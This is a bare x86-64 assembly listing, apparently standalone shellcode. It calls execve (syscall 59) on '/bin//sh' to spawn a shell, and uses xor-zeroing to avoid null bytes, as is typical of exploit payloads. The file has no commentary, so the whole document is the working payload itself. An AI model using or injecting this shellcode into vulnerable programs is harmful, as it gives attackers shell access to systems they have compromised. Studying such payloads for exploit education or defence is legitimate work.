section .text
	global _start

_start:
	xor rax,rax
	add rax,59
	xor rdi,rdi
	push rdi
	mov rdi,0x68732f2f6e69622f
	push rdi
	lea rdi,[rsp]
	xor rsi,rsi
	xor rdx,rdx
	syscall
